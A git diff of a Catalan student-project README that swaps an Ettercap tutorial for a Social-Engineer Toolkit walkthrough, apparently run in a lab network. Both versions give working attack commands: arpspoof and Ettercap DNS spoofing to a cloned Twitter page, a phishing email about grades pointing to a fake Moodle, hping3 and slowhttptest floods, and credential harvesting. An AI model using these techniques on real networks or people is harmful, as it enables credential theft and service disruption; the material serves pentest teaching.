@@ -26,23 +26,15 @@
 
 # __Index__
 
-+ **Ettercap**: [--> readME <--](#ettercap)
++ **Setoolkit**: [--> readME <--](#setoolkit)
 
-+ **Els atacs que es poden fer a Ettercap**: [--> readME <--](#els-atacs-que-es-poden-fer-a-ettercap)
+    + **Com funciona SET?**: [--> readME <--](#com-funciona-set)
 
-    + **Eavesdropping (Escoltar atentament)**: [--> readME <--](#eavesdropping-escoltar-atentament)
++ **Exemple pràctic amb Bettercap i Setoolkit (fake webpage) & Credential Harvester**: [--> readME <--](#exemple-pràctic-amb-bettercap-i-setoolkit-fake-webpage--credential-harvester)
 
-    + **Falsificació de direccions IP (Address Spoofing o DNS Cache Poisoning + ARP Spoof)**: [--> readME <--](#falsificació-de-direccions-ip-address-spoofing-o-dns-cache-poisoning--arp-spoof)
+    + **Cleanest DNS Spoof with Bettercap & Setoolkit**: [--> readME <--](#cleanest-dns-spoof-with-bettercap--setoolkit)
 
-    + **Atac de denegació de servei (DoS)**: [--> readME <--](#atac-de-denegació-de-servei-dos)
-
-    + **Atac Man in the Middle**: [--> readME <--](#atac-man-in-the-middle)
-
-+ **Exemple pràctic d'Ettercap**: [--> readME <--](#exemple-pràctic-dettercap)
-
-    + **Exemple utilitzant __setoolkit__ a Kali Linux i ETTERCAP**: [--> readME <--](#exemple-1-utilitzant-setoolkit-a-kali-linux-i-ettercap)
-
-    + **Explicació resumida**: [--> readME <--](#explicació-resumida)
+        + **(ARP Spoof + DNS Spoof) amb Setoolkit (Mail Phishing + Site Cloner + Credential Harvester)**: [--> readME <--](#arp-spoof--dns-spoof-amb-setoolkit-mail-phishing--site-cloner--credential-harvester)
 
 + **Bibliografia**: [--> readME <--](#bibliografia)
 
@@ -52,290 +44,212 @@
 <br>
 <br>
 
-# __Kali Linux__
+# __Setoolkit__
 
-## __Ettercap__
+__Social-Engineer Toolki (SET)__ és un framework de codi obert per fer __pentesting__ de __sistemes i xarxes__, enfocat específicament a __atacs d'enginyeria social__ per aconseguir el seu objectiu. SET té una sèrie d'eines per fer atacs personalitzats que ens permetran fer un atac de manera ràpida i efectiva. Aquesta eina ha estat desenvolupada per la signatura de seguretat TrustedSec i està disponible de manera lliure per a tots nosaltres.
 
-Ettercap és una eina de rastreig de xarxa basada en la suplantació d'adreces ARP.  
+__L'enginyeria social__ és una de les portes d'accés més utilitzades pels __delinqüents__ per __robar__ la teva __informació personal__ o __infiltrar-se__ en una empresa. 
 
-Té olfacte de connexions dinàmiques, filtratge de contingut dinàmic i molts altres trucs interessants.  
+Per aquest motiu cada pentest que fem a una organització, sempre s'han d'incloure tècniques __d'enginyeria social__, per veure que l'empresa és tan vulnerable a aquest tipus d'atacs i prendre les mesures corresponents.
 
-És compatible amb l'anàlisi activa i passiva de molts protocols i inclou moltes característiques per a l'anàlisi de xarxa i amfitrió.  
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/BETTERCA-CRYPTOSEC0.PNG?raw=true)
 
-És principalment adequat per canviar les xarxes dàrea local.  Amb lajuda del programari sniffer EtterCap, els provadors de penetració poden detectar la seguretat de la comunicació de dades de text clar a la xarxa i prendre mesures oportunes per evitar que les dades confidencials de nom dusuari / contrasenya es transmetin en text clar.
+> Img src: @Aaron & Cristian's Github (Exemple de Setoolkit)
 
-Amb __Ettercap__, podem simular un atac, un atac és una manera de destruir, exposar i obtenir accés no autoritzat a dades i ordinadors.
+## __Com funciona SET?__
 
-Un atacant és una persona que roba les vostres dades sense permís i una característica d'alguns atacs és que estan ocults.  
+Amb SET podem efectuar atacs com:
 
-Els atacs no sempre són senzills;  la majoria són complexos i és un gran repte per als investigadors de seguretat i les empreses que ofereixen una solució per a ells.  
++ __Site cloning:__ Clona qualsevol pàgina web.
 
-Un atac pot ser actiu o passiu:
++ __Credential harvest:__ Roba les credencials HTTP.
 
-+ __Atac actiu__: En aquest tipus d'atac, l'atacant intenta alterar els recursos del sistema o destruir-ne les dades. L'Atacant pot canviar les dades.
++ __Mail Attack:__ Atac del tipus DOS contra servidors de correu.
 
-+ __Atac passiu__: En aquest tipus d'atac, l'atacant intenta obtenir informació del sistema sense destruir la informació. Aquest atac és més aviat vigilància i reconeixement de l'objectiu.
++ __DOS Attack:__ H3ping, slowhttp entre altres atacs de DOS.
 
-![](./Photos/Etter1.png)
++ __Metasploits:__ Proporciona informació sobre vulnerabilitats de seguretat.
 
-Diferents tipus d'atacs actius i pasius:
+... _entre altres_.
 
-Atac actiu:
 
-+ Atac de denegació de servei (DoS).
+# __Exemple pràctic amb Bettercap i Setoolkit (fake webpage) & Credential Harvester__
 
-+ Spoofing.
+## __Cleanest DNS Spoof with Bettercap & Setoolkit__
 
-+ Man in the middle.
+### __(ARP Spoof + DNS Spoof) amb Setoolkit (Mail Phishing + Site Cloner + Credential Harvester)__ 
 
-+ Enverinament ARP.
+Amb l'ARP Spoof d'abans activarem un _dnsspoof_ i injectarem un registre de DNS fals on ens redirigirà a la nostra màquina on hi tindrem una _fake page: m0odle.escoladeltreball.org_ (__Moodle EDT__) i l'enviarem per correu utilitzant __SET__ dient que "_URGENT! L'Eduard ha posat les notes de M06, entra urgentment i mira la nota que tens!!!_" llavors l'usuari entrarà i no se n'adonarà i li robarem les credencials mostrades al __SET__.
 
-+ Desbordament.
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/arps.PNG?raw=true)
 
-Atac pasiu:
+> Img src: @Aaron & Cristian's Github
 
-+ Escáneres de puertos.
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/arps0.PNG?raw=true)
 
-+ Idle Scan (escaneo inactivo).
+> Img src: @Aaron & Cristian's Github
 
-# __Els atacs que es poden fer a Ettercap__
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/arps1.PNG?raw=true)
 
-## __Eavesdropping (Escoltar atentament)__
+> Img src: @Aaron & Cristian's Github
 
-Segur que et resulta familiar;  és una cosa molt normal a la vida.  Imagina't que vols trobar alguna informació sobre dos amics i la seva relació.  Una manera molt senzilla és escoltar en secret les vostres paraules.  Aquest tipus d'atac també es produeix a les comunicacions informàtiques, però es coneix com a __sniffing__.
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/arps2.PNG?raw=true)
 
-![](https://www.consultantsreview.com/newstransfer/upload/r8so8rsz_data_sniffing.jpg)
+> Img src: @Aaron & Cristian's Github
 
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/arps3.PNG?raw=true)
 
-Quan xateges amb el teu amic en mode “text clar”, és possible olorar el teu trànsit.  Pot semblar antic, però pots estar segur que és un dels problemes de seguretat més grans en una xarxa que els administradors de xarxa no tenen en compte. 
+> Img src: @Aaron & Cristian's Github
 
-## __Falsificació de direccions IP (Address Spoofing o DNS Cache Poisoning + ARP Spoof)__
+<br>
+<br>
 
-Sé que saps què és una adreça IP (Protocol d'Internet).  Com saps, per comunicar-se amb altres ordinadors, cada ordinador necessita una IP.  En aquest atac, un atacant vol fer una adreça de destinació falsa i enganyar-te sobre això.  Per exemple, el teu objectiu és mibanco.com i un atacant reenvia la teva petició a un fals mibanco.com.  L'objectiu és suplantar el host víctima.
+### A partir d'aquí generem el __mail phishing__ desde un compte de gmail robat a __CryptoSEC__.
 
-![](https://cdn.imghaste.com/esgeeks.com/media/2021/04/Suplantacion-de-IP.jpg?webp=true&v=1.0.1)
+1. Seleccionem la opció 5: __Mass Mailer Attack__.
 
-## Atac de denegació de servei (DoS)
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/PHISHING0.PNG?raw=true)
 
-En aquest tipus d'atac, un atacant intenta fer que una màquina o un recurs de xarxa no estigui disponible per als usuaris.  
+> Img src: @Aaron & Cristian's Github
 
-L'objectiu és interrompre o suspendre els serveis que es connecten a Internet.  Aquest atac es dirigeix ​​a gateways i servidors web, com els dels bancs, i realitza alguns dels sabotatges següents.
+2. Seleccionem la opció 5: __Mass Mailer Attack__. Omplim les opcions: `1`, `email destination`, `1`, `our email address`, `our email password`, `priority`, `attach file`, `fake email subject`, `body of messeage with END`
 
-+ Ús de recursos computacionals, com lample de banda, la memòria, lespai en disc o fins i tot la CPU.  Com suposo, la teva ment podria divagar cap al codi maliciós.  
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/phish0.PNG?raw=true)
 
-+ Destrueix la informació i les taules d'encaminament.
+> Img src: @Aaron & Cristian's Github
 
-+ Interrompre els components físics de la xarxa, com els routers, els switches i els firewalls.
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/phish1.PNG?raw=true)
 
-+ Envia dades no vàlides a aplicacions o serveis de xarxa.  Podeu acabar anormalment els serveis.
+> Img src: @Aaron & Cristian's Github
 
-+ Enviar molts paquets a les destinacions per inundar-los i finalment col·lapsar i apagar.
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/phish2.PNG?raw=true)
 
-+ Bloquejar les destinacions i que els usuaris autoritzats no hi puguin accedir.
+> Img src: @Aaron & Cristian's Github
 
-Al DDoS, un atacant pot utilitzar la tècnica del Zombie per capturar molts ordinadors i enviar moltes peticions a la víctima a través d'ells o de bots.  Zombie vol dir que un ordinador connectat a Internet ha estat compromès per un hacker.
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/phish3.PNG?raw=true)
 
+> Img src: @Aaron & Cristian's Github
 
-![](https://nextvision.com/wp-content/uploads/2018/05/Captura-de-pantalla-2018-05-29-a-las-3.52.42-p.m.-2.png)
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/PHISHING4.PNG?raw=true)
 
+> Img src: @Aaron & Cristian's Github
 
-## __Atac Man in the Middle__
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/PHISHING2.PNG?raw=true)
 
-L'atac man-in-the-middle (abreujat MITM, MitM, MIM, MiM, MITMA) és una forma d'atac actiu en què un atacant estableix una connexió entre les víctimes i envia missatges entre elles.  
+> Img src: @Aaron & Cristian's Github
 
-Així, les víctimes creuen que estan parlant directament entre elles, però en realitat un atacant ho controla.  
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/PHISHING3.PNG?raw=true)
 
-En aquest escenari, un atacant ha tingut èxit quan es pot fer passar per un usuari.  
+> Img src: @Aaron & Cristian's Github
 
-D'altra banda, hi ha una tercera persona entre tu i la persona amb qui et comuniques i pot controlar i vigilar el teu trànsit.  
-
-
-![](https://cisomag.eccouncil.org/wp-content/uploads/2021/09/MicrosoftTeams-image-28.png)
-
-Afortunadament, alguns protocols poden impedir-ho, com el SSL.  
-
-Un hacker pot utilitzar el següent programari per implementar aquest atac:
-
-* Caín i Abel
-
-* Subterfugi
-
-* __Ettercap__: És el que utilitzarem
- 
-* AirJack
-
-* __SSLStrip__: L'utilitzarem per trencar el SSL.
-
-* __SSLSniff__
-
-# __Exemple pràctic d'Ettercap__
-
-## __Exemple 1: Utilitzant __setoolkit__ a Kali Linux i ETTERCAP__
-
-Demostració ràpida de com DNS pot ser suplantat utilitzant Kali Linux, i com el tràfic pot ser redirigit a una pàgina fraudulenta.
-
-Hem decidit fer phishing la pàgina de Twitter utilitzant una eina anomenada "setoolkit" i fer un clonatge de la pàgina de Twitter.
-
-Posteriorment suplantar el registre DNS en la que apuntava a twitter.com a la nostra màquina, on hi tenim un allotjat una pàgina fraudulenta utilitzant l'eina.
-
-_Website Attack Vectors -> Creditials Harvestor -> Clone website / Use Web Template_
-
-
-Utilitzarem un "toolkit" anomenat "setooklit" que es permetrà fer phishing a una pàgina i fer un clonatge perfecte.
-
-![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Official%20Documentation/Hacking%20&%20Pentesting/DNS%20Spoofing/Photos/SeTool.png?raw=true)
-
-
-Podem fer un clonatge d'una pàgina web o també té "templates" pre definides. En aquest exemple utilitzarem el template de https://www.twitter.com
-
-Tarda una estona.
-
-![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Official%20Documentation/Hacking%20&%20Pentesting/DNS%20Spoofing/Photos/SeToolkitTwitterClone.png?raw=true)
-
-![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Official%20Documentation/Hacking%20&%20Pentesting/DNS%20Spoofing/Photos/Suplantació.png?raw=true)
-
-
-Com podem observar la pàgina de Twitter està a la nostra IP 10.200.243.137 al port 80.
-
-Ara necessitem que tot el tràfic per a twitter.com sigui redirigit a la meva IP. Utilitzarem DNS Spoof que està disponible a ETTERCAP.
-
-S'ha de canviar el contigut del fitxer etter.dns per a que twitter.com apunto a la nostra IP.
-
-`apt-get install mlocate`
-
-`updatedb`
-
-`locate etter.dns`
-
-┌──(root㉿osboxes)-[/home/anonymous]
-└─# locate etter.dns
-/etc/ettercap/etter.dns
-/usr/share/ettercap/etter.dns.examples
-
-`cp /etc/ettercap/etter.dns /etc/ettercap/etter.dns.original`
-
-`vi /etc/ettercap/etter.dns`
-
-```
-*.twitter.com   A       10.200.243.137
-www.twitter.com PTR     10.200.243.137
-
-www.alor.org    A       127.0.0.1
-www.naga.org    A       127.0.0.1
-```
-
-__Obrim Ettercap.__
-
-
-![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Official%20Documentation/Hacking%20&%20Pentesting/DNS%20Spoofing/Photos/Ettercap.png?raw=true)
-
-
-
-`ettercap --gtk` --> Fem el loadup.
-
-
-Ens anem a `Plugins` --> `Manage the Plugins` --> `DNS Spoof plugin` --> L'activem.
-
-![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Official%20Documentation/Hacking%20&%20Pentesting/DNS%20Spoofing/Photos/DNSSpoof.png?raw=true)
-
-
-
-A continuació, ARP enverinará tots els amfitrions de la xarxa, de manera que tot el trànsit passa per la nostra màquina (atacant) --> començarem a "esnifar".
-
-Quan algú intenti accedir a twitter.com, la finestra d'ettercap dirà "bla_bla.twitter.com" falsificat a la ip de l'atacant `<la_nostra_ip>`.
-
-Al mateix temps, a la finestra SET, veuràs "tenim un èxit!!" juntament amb alguna altra informació. Si la víctima és prou crédula per introduir les seves credencials a la vostra pàgina de pesca, veureu aquests detalls a la finestra SET.
-
-Però heu de jugar al joc d'espera i esperar fins que algú intenti accedir al lloc web de pesca. 
-
-```
-# Kali Linux
-
-arp -a
-
-arpspoof -i eth0 -t 10.200.243.211 10.200.243.1 # Suplantació redirecció de paquets al Client
-
-arpspoof -i eth0 -t 10.200.243.1 10.200.243.211 # Suplantació redirecció de paquets al Servidor
-
-```
-
-```
-# Host local
-
-Connectar-se a Twitter - Farà la redirecció a 10.200.243.137
-
-
-```
-
-![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Official%20Documentation/Hacking%20&%20Pentesting/DNS%20Spoofing/Photos/DNSSpoof.png?raw=true)
-
-
-
-## __Ettercap per CLI__
-
-- https://esgeeks.com/tutorial-ettercap-ejemplos/
-
-Utilitza la següent ordre per llançar una suplantació de DNS:
-
-sudo ettercap -T -q -P dns_spoof -i wlan0 -M arp /// ///
-
-#Un altre comandament, per a tota la xarxa
-sudo ettercap -T -q -M arp -i wlan0 -P dns_spoof -p //192.168.1.1/
-
-#Per a un rang de xarxa
-sudo ettercap -T -q -M arp -i wlan0 -P dns_spoof //192.168.1.1/ 192.168.1.51/
-
-# __Explicació resumida:__
-
-ARP Spoof - DNS Cache Poisoning
-
-IP Atacant. 10.200.243.137 
-MAC Atacant: 08:00:27:16:51:52
-
-IP Victima: 10.200.243.212
-MAC Victima: 18:c0:4d:a0:8f:c8
-
-IP Router Gateway: 10.200.243.1
-MAC Router Gateway: 00:22:57:be:53:01
-
-Pàgina clonada: http://www.twitter.com
-
-SPOOF del tràfic entre la VÍCTIMA I EL ROUTER --> ES CANVIA LA MAC DEL CLIENT VICTIMA PER LA MEVA: 18:c0:4d:a0:8f:c8 PER LA MEVA (ATACANT): 08:00:27:16:51:52.
-
-EN REALITAT QUI CONECTA AMB EL SERVIDOR, SOC JO NO LA VÍCTIMA. FEM LA TORNADA.
- 
-└─# arpspoof -i eth0 -t 10.200.243.212 10.200.243.1
-8:0:27:16:51:52 18:c0:4d:a0:8f:c8 0806 42: arp reply 10.200.243.1 is-at 8:0:27:16:51:52
-
-"Tot el fluxe que va del servidor a la víctima, redirigeix-los a la meva màquina"
-
-TORNADA
-
-SPOOF del tràfic entre la EL ROUTER I LA VICTIMA --> ES CANVIA LA MAC DEL DEL ROUTER PER LA MEVA: 0:22:57:be:53:1 PER LA MEVA (ATACANT): 08:00:27:16:51:52.
-
-EN REALITAT QUI CONECTA AMB EL SERVIDOR, SOC JO NO LA VÍCTIMA. FEM LA TORNADA.
-
-┌──(root㉿osboxes)-[/home/anonymous]
-└─# arpspoof -i eth0 -t 10.200.243.1 10.200.243.212
-8:0:27:16:51:52 0:22:57:be:53:1 0806 42: arp reply 10.200.243.212 is-at 8:0:27:16:51:52
-8:0:27:16:51:52 0:22:57:be:53:1 0806 42: arp reply 10.200.243.212 is-at 8:0:27:16:51:52
-
-"Tot el fluxe que va de la víctima al servidor, redirigeix-los a la meva màquina"
-
-
-_RESUM: TOT EL TRÀFIC DE PAQUETS QUE SURT DE LA VÍCTIMA AL SERVIDOR, SERÀN "FORWARD" AL MEU CLIENT ATACANT. JA QUE EL LA VÍCTIMA CREU QUE QUI CONTACTA ES AL ROUTER, PERO NO. SUPLANTO LA MAC DESTÍ DEL ROUTER PER LA MEVA._
-
-![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Official%20Documentation/Hacking%20&%20Pentesting/DNS%20Spoofing/Photos/New22.png?raw=true)
-
-![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Official%20Documentation/Hacking%20&%20Pentesting/DNS%20Spoofing/Photos/New23.png?raw=true)
 
 
 <br>
 <br>
 <br>
+<br>
+<br>
+
+
+
+
+## __Attacking SOA and Forward DNS Servers with DOS (SlowHTTP - Attack cryptosec.net web Apache2)__
+
+Ídem que l'anterior però els targets son el __SOA__ i el __Forwarding__, els clients interns de CryptoSEC quan hagin d'anar a la pàgina web __cryptosec.net__, entraràn a __cryptos3c.net__ ja que el hacker ha avisat que hi ha una urgència a la pàgina principal i han d'entrar a la pàgina web dada pel hacker i les seves credencials seran __robades sense que se'n adoni__!
+
+1. El hacker activar el ARP Spoof amb targets del SOA i el Forwarder.
+
+2. El hacker ha realitzat un DOS per tumbar l'apache2 (SOA): `hping3 --randsource -p80 -S --flood 10.200.243.164`
+
+Ara explicaré què significa cada part de l'ordre:
+
+- __p 80__ és el port que triem atacar
+
+- S activa el flag Syn
+
+– flood indica a hping que enviï els paquets a la màxima velocitat possible
+
+- ip_victima és la __ip__ o __domini__ a atacar
+
+Si volem que la nostra ip no sigui visible podem afegir-li l'opció –ai la ip que falsejarem o bé utilitzar –rand-source amb què es generen adreces d'origen ip a l'atzar:
+
+``hping3 --randsource -p80 -S --flood 10.200.243.164``
+
+o també podem utilitzar: `Slowhttptest`, nosaltres utilitzarem __slowhttptest__.
+
+> _slowhttptest - Denial Of Service attacks simulator_
+
+`slowhttptest -c 40000 -H -i 30 -r 500 -l 600 -u http://cryptosec.net`
+
+``-c`` _number of connections
+Specifies the target number of connections to establish during the test._
+
+``-H'`` _Starts slowhttptest in SlowLoris mode, sending unfinished HTTP requests._
+
+``-i`` _seconds
+Specifies the interval between follow up data for slowrois and Slow POST tests._
+
+``-r`` _connections per second
+Specifies the connection rate._
+
+``-l`` _seconds
+Specifies test duration in seconds._
+
+``-u`` _URL
+Specifies the URL._
+
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/DOS-CRYPTOSEC.NET.PNG?raw=true)
+
+> Img src: @Aaron & Cristian's Github
+
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/PAGE-DOWN.PNG?raw=true)
+
+> Img src: @Aaron & Cristian's Github
+
+2. El hacker activa la pàgina del __cryptos3c.net__ (fake) amb el SET (__Social Engineering Tool__).
+
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/BETTERCA-CRYPTOSEC0.PNG?raw=true)
+
+> Img src: @Aaron & Cristian's Github
+
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/BETTERCA-CRYPTOSEC1.PNG?raw=true)
+
+> Img src: @Aaron & Cristian's Github
+
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/BETTERCA-CRYPTOSEC2.PNG?raw=true)
+
+> Img src: @Aaron & Cristian's Github
+
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/BETTERCA-CRYPTOSEC3.PNG?raw=true)
+
+> Img src: @Aaron & Cristian's Github
+
+3. El hacker emet un comunicat general a l'empresa dient que s'ha caigut temporalment la pàgina principal i que han d'entrar per la pàgina següent `cryptos3c.net`
+
+
+4. Des d'un client de la xarxa interna de CryptoSEC 192.168.3.100 (_Linux Lite Client_) es vol conectar a la pàgina web de cryptosec.net, però han emès un comunicat que els redirecciona a __cryptos3c.net__ ja que la pàgina principal ha sigut hackejada amb DOS (denegació de servei).
+
+![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/BETTERCA-CRYPTOSEC4.PNG?raw=true)
+
+> Img src: @Aaron & Cristian's Github
+
+5. Les credencials del client han __sigut robades__!
+
 
 # __Bibliografia__: 
-https://esgeeks.com/tutorial-ettercap-ejemplos/
-https://programmerclick.com/article/2815493326/
-https://www.amirootyet.com/post/how-to-spoof-dns-in-kali-linux/
-https://es.acervolima.com/ataque-mitm-man-in-the-middle-usando-arp-poisoning/
+
+- https://github.com/trustedsec/social-engineer-toolkit
+- https://www.nubetia.com/que-es-setoolkit/
+- https://www.hackplayers.com/2012/10/social-engineering-toolkit-set.html
+- https://www.dragonjar.org/video-tutorial-set-social-engineering-toolkit.xhtml
+- https://programmerclick.com/article/72081442265/
+- https://infosecwriteups.com/sending-emails-using-social-engineering-toolkit-setoolkit-97427712c809
+- https://deepsec.com.mx/blog/f/social-engineer-toolkit-%7C-como-usarla
+- https://www.tutorialspoint.com/kali_linux/kali_linux_social_engineering.htm
+- https://www.nubetia.com/ngrok-setoolkit-kali-linux-2020-ataque-phishing/
+- https://www.hacking-tutorial.com/hacking-tutorial/15-step-to-hacking-windows-using-social-engineering-toolkit-and-backtrack-5/#sthash.zDxf6lK5.dpbs
+- https://www.youtube.com/watch?v=MkEet3Akvyo&t=206s
+- https://www.youtube.com/watch?v=jmXT-c6dcOk
+- https://www.youtube.com/watch?v=Jjulz-xHwEo&t=9s
+- https://www.youtube.com/watch?v=aM5yjJ8JUME
+- https://www.youtube.com/watch?v=u9dBGWVwMMA&t=594s
